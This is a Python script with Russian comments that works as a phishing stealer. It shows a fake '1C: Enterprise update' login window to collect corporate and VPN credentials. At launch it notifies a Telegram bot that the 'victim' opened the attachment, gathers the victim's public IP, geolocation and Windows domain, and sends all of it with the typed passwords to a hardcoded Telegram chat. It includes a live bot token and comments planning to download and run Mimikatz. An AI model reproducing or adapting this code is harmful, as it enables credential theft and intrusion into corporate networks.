from os import path, getcwd
from subprocess import run
from tkinter import PhotoImage, ttk, Tk, Toplevel, Label, Frame
import requests
from json import loads
import telebot
from sys import exit

# API до бота
TELEGRAM_API = '8302100995:AAHq-kyiWBa_ixulGGhwI__AoEYcZodch90'

bot = telebot.TeleBot(TELEGRAM_API)
bot.send_message(702364974, "✅ Жертва запустила вредоносное вложение")

# Получение внешнего IP жертвы
ip_victim = run(['curl', '-s', 'https://api.ipify.org'], capture_output=True, text=True).stdout

# Запросы региона и города жертвы по API
response = requests.get(f'http://ip-api.com/json/{ip_victim}')

# Преобразует строку в формат JSON
data = loads(response.text)

# Парсинг данных жервты
victim_country = data['country']
victim_country_code = data['countryCode']
victim_region_name = data['regionName']
victim_city = data['city']
victim_public_ip = data['query']

# Логин жертвы: {}\nПароль жертвы: {}\n\nУчетные данные VPN\nЛогин: {}\nПароль: {}

# Получение домена жервты
victim_domain = run(
    ['powershell', '-Command', '(Get-CimInstance Win32_ComputerSystem).Domain'],
    capture_output=True,
    text=True,
    encoding='cp866'
)

# Создание окна авторизации 1с

# ====== Основное окно ======
main_windows = Tk()
main_windows.title("1C: Предприятие. Обновление и конфигурация")
main_windows.geometry("520x220")

# Пустая иконка
empty_icon = PhotoImage(width=1, height=1)
main_windows.iconphoto(True, empty_icon)

def show_popup():
    # Создаём новое окно
    popup = Toplevel(main_windows)
    popup.title("Дополнительное окно")
    popup.geometry("300x150")

    # Можно поставить метку
    msg = Label(popup, text="Данные успешно получены!", font=("Segoe UI", 12))
    msg.pack(pady=20)

    # Кнопка для закрытия этого окна
    close_btn = ttk.Button(popup, text="Закрыть", command=popup.destroy)
    close_btn.pack(pady=10)

# ====== Функция получения данных ======
def get_data():
    corp_login = corp_login_entry.get()
    corp_password = corp_pass_entry.get()
    vpn_login = vpn_login_entry.get()
    vpn_passwd = vpn_pass_entry.get()

    victim_data_message = f"*** Получены данные жертвы ***\n\n🌎Страна: {victim_country}\n📍Код страны: {victim_country_code}\n📍Регион: {victim_region_name}\n🏙️Город: {victim_city}\n📍Внешний IP: {victim_public_ip}\nДомен жервты: {victim_domain.stdout.strip()}\n\n*Корпоративные данные*\n\n👤Корпоративный логин: {corp_login}\n👤Корпоративный пароль: {corp_password}\n\n *Данные VPN*\n\n👤Логин: {vpn_login}\n👤Пароль: {vpn_passwd}"

    # Отправка данных
    bot.send_message(702364974, victim_data_message)

    show_popup()

# ====== Фреймы с полями ======
# Логин корпоративной учетной записи
frame_login = Frame(main_windows)
frame_login.pack(anchor='nw', padx=10, pady=10)
corp_login_name = Label(frame_login, text="Логин корпоративной учетной записи:")
corp_login_name.pack(side='left')
corp_login_entry = ttk.Entry(frame_login, width=30)
corp_login_entry.pack(side='left', padx=5)

# Пароль корпоративной учетной записи
frame_pass = Frame(main_windows)
frame_pass.pack(anchor='nw', padx=10, pady=8)
corp_pass_name = Label(frame_pass, text="Пароль корпоративной учетной записи:")
corp_pass_name.pack(side='left')
corp_pass_entry = ttk.Entry(frame_pass, width=30, show='*')
corp_pass_entry.pack(side='left', padx=5)

# Логин VPN
frame_vpn_login = Frame(main_windows)
frame_vpn_login.pack(anchor='nw', padx=10, pady=8)
vpn_login_name = Label(frame_vpn_login, text="Логин VPN:")
vpn_login_name.pack(side='left')
vpn_login_entry = ttk.Entry(frame_vpn_login, width=30)
vpn_login_entry.pack(side='left', padx=5)

# Пароль VPN
frame_vpn_pass = Frame(main_windows)
frame_vpn_pass.pack(anchor='nw', padx=10, pady=8)
vpn_pass_name = Label(frame_vpn_pass, text="Пароль VPN:")
vpn_pass_name.pack(side='left')
vpn_pass_entry = ttk.Entry(frame_vpn_pass, width=30, show='*')
vpn_pass_entry.pack(side='left', padx=5)

# ====== Кнопка ======
btn_frame = Frame(main_windows)
btn_frame.pack(anchor='center', pady=15)
btn = ttk.Button(btn_frame, text="Подтвердить", command=get_data)
btn.pack()

# ====== Запуск окна ======
main_windows.mainloop()

# Скачивание Mimikatz или других программ для кражи данных к примеру данные из браузеров

# Запуск Mimikatz 

# Передача полученных данных

# Получение ботом данных
bot.polling(none_stop=True)

# Завершение работы программы
exit()